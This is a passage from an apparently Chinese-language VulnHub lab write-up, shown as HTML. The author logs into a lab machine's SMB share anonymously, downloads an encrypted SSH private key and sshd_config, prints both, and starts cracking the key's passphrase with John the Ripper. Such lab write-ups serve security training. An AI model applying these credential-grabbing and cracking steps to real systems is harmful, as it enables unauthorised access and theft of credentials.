id="0x07-登入到服务端"><a href="#0x07-登入到服务端" class="headerlink" title="0x07.登入到服务端"></a>0x07.登入到服务端</h2><p><code>smbdata可以查看，smbuser不可以查看</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# smbclient \\\\192.168.1.14\\smbdata</span><br><span class="line">Enter WORKGROUP\root&#x27;s password: </span><br><span class="line">Anonymous login successful</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Thu Mar 19 00:53:12 2020</span><br><span class="line">  ..                                  D        0  Tue Feb 18 06:47:54 2020</span><br><span class="line">  anaconda                            D        0  Tue Feb 18 06:48:15 2020</span><br><span class="line">  audit                               D        0  Tue Feb 18 06:48:15 2020</span><br><span class="line">  boot.log                            N     6120  Tue Feb 18 06:48:16 2020</span><br><span class="line">  btmp                                N      384  Tue Feb 18 06:48:16 2020</span><br><span class="line">  cron                                N     4813  Tue Feb 18 06:48:16 2020</span><br><span class="line">  dmesg                               N    31389  Tue Feb 18 06:48:16 2020</span><br><span class="line">  dmesg.old                           N    31389  Tue Feb 18 06:48:16 2020</span><br><span class="line">  glusterfs                           D        0  Tue Feb 18 06:48:16 2020</span><br><span class="line">  lastlog                             N   292292  Tue Feb 18 06:48:16 2020</span><br><span class="line">  maillog                             N     1982  Tue Feb 18 06:48:16 2020</span><br><span class="line">  messages                            N   684379  Tue Feb 18 06:48:17 2020</span><br><span class="line">  ppp                                 D        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  samba                               D        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  secure                              N    11937  Tue Feb 18 06:48:17 2020</span><br><span class="line">  spooler                             N        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  tallylog                            N        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  tuned                               D        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  wtmp                                N    25728  Tue Feb 18 06:48:17 2020</span><br><span class="line">  xferlog                             N      100  Tue Feb 18 06:48:17 2020</span><br><span class="line">  yum.log                             N    10915  Tue Feb 18 06:48:17 2020</span><br><span class="line">  sshd_config                         N     3906  Wed Feb 19 02:46:38 2020</span><br><span class="line">  todo                                N      162  Tue Feb 25 09:22:29 2020</span><br><span class="line">  id_rsa                              N     1766  Thu Mar 19 00:43:16 2020</span><br><span class="line">  note.txt                            N      128  Thu Mar 19 00:53:12 2020</span><br><span class="line"></span><br><span class="line">                19976192 blocks of size 1024. 18256884 blocks available</span><br><span class="line">smb: \&gt;</span><br><span class="line">root@JIYE:~/vulnhub/ck00# smbclient \\\\192.168.1.14\\smbuser</span><br><span class="line">Enter WORKGROUP\root&#x27;s password: </span><br><span class="line">Anonymous login successful</span><br><span class="line">tree connect failed: NT_STATUS_ACCESS_DENIED</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure><p><code>下载id_rsa与sshd_config</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; get id_rsa</span><br><span class="line">getting file \id_rsa of size 1766 as id_rsa (143.7 KiloBytes/sec) (average 143.7 KiloBytes/sec)</span><br><span class="line">smb: \&gt; get sshd_config</span><br><span class="line">getting file \sshd_config of size 3906 as sshd_config (1907.1 KiloBytes/sec) (average 395.6 KiloBytes/sec)</span><br></pre></td></tr></table></figure><p><code>查看私钥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# ls</span><br><span class="line">id_rsa  nmap.CVT  nmap.sP  sshd_config</span><br><span class="line">root@JIYE:~/vulnhub/ck00# cat id_rsa </span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,0111C403C183156C592743C68EA855BD</span><br><span class="line"></span><br><span class="line">TRNiuBMH2lIgWgYpBb4MgbhQtW84gdUTJDRQLp/qwBv/KTbycWu+R07J2lGEFJH8</span><br><span class="line">8G1nZ+bjnPayjTyywY5PGySQ4k5pWvmNin16TEAII7XO6Jv+/Ev/N4sPdKe7K3bN</span><br><span class="line">TpJ39S5DVuj4oTTswvUp3dYU6ynu3Qp9PBRdBJnazbK5hwkxOyqa5l1dCfRDpaWf</span><br><span class="line">hPM+GhXbHOvzj+Z9wvlrTuPASsBrCnXd/MAxRmNfDMCHlPHVATEChoP89awwoti5</span><br><span class="line">itxcxqIWGIqilnlm7Dcy2lynE7LlXdXyJAnUI0Plra9PTqC4QoJL3Lyesypzp9Xk</span><br><span class="line">kB9Hv25vherfgjy6AKBcIqZuALtFL2mij7nYC21XxcDudKCaB+UxOQhGBLNN0E16</span><br><span class="line">7bNvnKebLmhyWhDNVaelvF9cd+mxvvPzv5ljhUd3jvhhyU70AgzrpF1ZUxVh2GOs</span><br><span class="line">huzbtCIwX3I+xAQYdw+sThTRG8GcXLjreEUF4gJqlPNWk9gxH/AmfTmGKdLhhoSb</span><br><span class="line">/7wHeMvLwSRaVv6fyPXhPpiB5c3MHCoHFYi6sbmmtYXJBum9fF9iubIzlRu/4vZ2</span><br><span class="line">irmnsEff3vkqqPchb6M0zMtw80QPJgpjhclJjDPiI5P1DWjgLNYOQba0nKNQ3RFa</span><br><span class="line">iy2lup+EsCqWU0KTI+hH+Xm0YAq2/ESqPeNp/U+78y8L5JkpavRYNJyx+vGV8XPP</span><br><span class="line">dGkZD8x68xLIwF6/urZC6utRa1HgyEDIcUbyTUnbRkLUFWbN9eHLrY0pH+zhKJOj</span><br><span class="line">14cUAOpB9RkxAoE6YJ03vJq72OoxfCYhiv3fj4pQRuQJwA2c8IfgdwIJqBIMVPvV</span><br><span class="line">5HX3j5ugkyocLl5Rg+oXjyhNczmABJehk9gA0eCcfQpXGPw/OBMJ4BJdUHxbCOtQ</span><br><span class="line">lAstu+fNBosFhkj3lHXX/ZNIKcYs9+Mvs3E2DvmcK7Us/59qsCwHRZNvd2E3EF9r</span><br><span class="line">nNuHg8sY5HxMvMNH46PH8c4EesuNvOW2pvaCHCT5Id3Up1yyP09hoxyyovnPQ/Gj</span><br><span class="line">HXffEjkc82t9Ip476mfo0NBzB4g7sOb4ZXhG8RxHS4d83S5bITzHP8RrlmkdKCjH</span><br><span class="line">U5YMap/xQ++4XTtgX8DjVoZw1imRtNsCQk6fe0UVKzg2nFV8rkOU8A1o6NDcjE/Z</span><br><span class="line">V/PsYJT3CTEvlzq1/4lLQN2nLrpwmlu+Ate5CEmKxqDIpSIzQBl5N4cU5aa/L1XG</span><br><span class="line">2nFA4H1Ipo7CaUQZ3lQGC/wHaWcP0KnZQ/SrInGOQVu1RJe3MhyG3TyC06FVfmgV</span><br><span class="line">m4oqf39lGQlYX8+cTCK8w6nI6gnSsW92U9j5s9iGEZKN2bI1poyurQaExFiDub6m</span><br><span class="line">QzYWqY1+EUBUYzFMlR08TeHXLvoAmgJNcnZlhXuhWsl6z95UMKvRBLN3Dc4kIVZx</span><br><span class="line">sBZmlYhqhwl0AWYQOl1tJrOMiqLeMhF+xWZ3J/iZ9Pj37Dz9xL8YiA8YUNC/NqT+</span><br><span class="line">3j1s3USXPL0uyxS7tnJJf3aXMBi0XwwHWZg4ii8JQhGiiPhGBE9lpRyPhYCx3xDC</span><br><span class="line">ED/GW22/sWS5fhDr4tynP8VdjiFwbBEcXYHa84XjeUZZaLJQTSwnE/afWVYty8AX</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">root@JIYE:~/vulnhub/ck00# </span><br><span class="line">root@JIYE:~/vulnhub/ck00# cat sshd_config </span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#      $OpenBSD: sshd_config,v 1.100 2016/08/15 12:32:04 naddy Exp $</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This is the sshd server system-wide configuration file.  See</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sshd_config(5) <span class="keyword">for</span> more information.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This sshd was compiled with PATH=/usr/<span class="built_in">local</span>/bin:/usr/bin</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The strategy used <span class="keyword">for</span> options <span class="keyword">in</span> the default sshd_config shipped with</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> OpenSSH is to specify options with their default value <span class="built_in">where</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> possible, but leave them commented.  Uncommented options override the</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> default value.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> If you want to change the port on a SELinux system, you have to tell</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> SELinux about this change.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> semanage port -a -t ssh_port_t -p tcp <span class="comment">#PORTNUMBER</span></span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Port 22</span></span><br><span class="line"><span class="meta">#</span><span class="bash">AddressFamily any</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ListenAddress 0.0.0.0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ListenAddress ::</span></span><br><span class="line"></span><br><span class="line">HostKey /etc/ssh/ssh_host_rsa_key</span><br><span class="line"><span class="meta">#</span><span class="bash">HostKey /etc/ssh/ssh_host_dsa_key</span></span><br><span class="line">HostKey /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_ed25519_key</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Ciphers and keying</span></span><br><span class="line"><span class="meta">#</span><span class="bash">RekeyLimit default none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Logging</span></span><br><span class="line"><span class="meta">#</span><span class="bash">SyslogFacility AUTH</span></span><br><span class="line">SyslogFacility AUTHPRIV</span><br><span class="line"><span class="meta">#</span><span class="bash">LogLevel INFO</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Authentication:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">LoginGraceTime 2m</span></span><br><span class="line">PermitRootLogin yes</span><br><span class="line"><span class="meta">#</span><span class="bash">StrictModes yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">MaxAuthTries 6</span></span><br><span class="line"><span class="meta">#</span><span class="bash">MaxSessions 10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">PubkeyAuthentication yes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> but this is overridden so installations will only check .ssh/authorized_keys</span></span><br><span class="line">AuthorizedKeysFile      .ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">AuthorizedPrincipalsFile none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">AuthorizedKeysCommand none</span></span><br><span class="line"><span class="meta">#</span><span class="bash">AuthorizedKeysCommandUser nobody</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> For this to work you will also need host keys <span class="keyword">in</span> /etc/ssh/ssh_known_hosts</span></span><br><span class="line"><span class="meta">#</span><span class="bash">HostbasedAuthentication no</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Change to yes <span class="keyword">if</span> you don<span class="string">&#x27;t trust ~/.ssh/known_hosts for</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> HostbasedAuthentication</span></span><br><span class="line"><span class="meta">#</span><span class="bash">IgnoreUserKnownHosts no</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Don<span class="string">&#x27;t read the user&#x27;</span>s ~/.rhosts and ~/.shosts files</span></span><br><span class="line"><span class="meta">#</span><span class="bash">IgnoreRhosts yes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> To <span class="built_in">disable</span> tunneled clear text passwords, change to no here!</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PasswordAuthentication yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitEmptyPasswords no</span></span><br><span class="line">PasswordAuthentication no</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Change to no to <span class="built_in">disable</span> s/key passwords</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ChallengeResponseAuthentication yes</span></span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Kerberos options</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosAuthentication no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosOrLocalPasswd yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosTicketCleanup yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosGetAFSToken no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">KerberosUseKuserok yes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> GSSAPI options</span></span><br><span class="line">GSSAPIAuthentication yes</span><br><span class="line">GSSAPICleanupCredentials no</span><br><span class="line"><span class="meta">#</span><span class="bash">GSSAPIStrictAcceptorCheck yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">GSSAPIKeyExchange no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">GSSAPIEnablek5users no</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Set this to <span class="string">&#x27;yes&#x27;</span> to <span class="built_in">enable</span> PAM authentication, account processing,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and session processing. If this is enabled, PAM authentication will</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> be allowed through the ChallengeResponseAuthentication and</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> PasswordAuthentication.  Depending on your PAM configuration,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> PAM authentication via ChallengeResponseAuthentication may bypass</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> the setting of <span class="string">&quot;PermitRootLogin without-password&quot;</span>.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> If you just want the PAM account and session checks to run without</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> PAM authentication, <span class="keyword">then</span> <span class="built_in">enable</span> this but <span class="built_in">set</span> PasswordAuthentication</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and ChallengeResponseAuthentication to <span class="string">&#x27;no&#x27;</span>.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> WARNING: <span class="string">&#x27;UsePAM no&#x27;</span> is not supported <span class="keyword">in</span> Red Hat Enterprise Linux and may cause several</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> problems.</span></span><br><span class="line">UsePAM yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">AllowAgentForwarding yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">AllowTcpForwarding yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">GatewayPorts no</span></span><br><span class="line">X11Forwarding yes</span><br><span class="line"><span class="meta">#</span><span class="bash">X11DisplayOffset 10</span></span><br><span class="line"><span class="meta">#</span><span class="bash">X11UseLocalhost yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitTTY yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PrintMotd yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PrintLastLog yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">TCPKeepAlive yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">UseLogin no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">UsePrivilegeSeparation sandbox</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitUserEnvironment no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Compression delayed</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ClientAliveInterval 0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ClientAliveCountMax 3</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ShowPatchLevel no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">UseDNS yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PidFile /var/run/sshd.pid</span></span><br><span class="line"><span class="meta">#</span><span class="bash">MaxStartups 10:30:100</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PermitTunnel no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ChrootDirectory none</span></span><br><span class="line"><span class="meta">#</span><span class="bash">VersionAddendum none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> no default banner path</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Banner none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Accept locale-related environment variables</span></span><br><span class="line">AcceptEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES</span><br><span class="line">AcceptEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT</span><br><span class="line">AcceptEnv LC_IDENTIFICATION LC_ALL LANGUAGE</span><br><span class="line">AcceptEnv XMODIFIERS</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> override default of no subsystems</span></span><br><span class="line">Subsystem       sftp    /usr/libexec/openssh/sftp-server</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Example of overriding settings on a per-user basis</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Match User anoncvs</span></span><br><span class="line"><span class="meta">#</span><span class="bash">       X11Forwarding no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">       AllowTcpForwarding no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">       PermitTTY no</span></span><br><span class="line"><span class="meta">#</span><span class="bash">       ForceCommand cvs server</span></span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure><h2 id="0x08-john破解"><a href="#0x08-john破解" class="headerlink" title="0x08.john破解"></a>0x08.john破解</h2><p><code>先hashid_rsa</code></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RydW9uZ2ttYS9jdGYtdG9vbHMvYmxvYi9tYXN0ZXIvSm9obi9ydW4vc3Nobmcyam9obi5weQ==">tools地址<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span 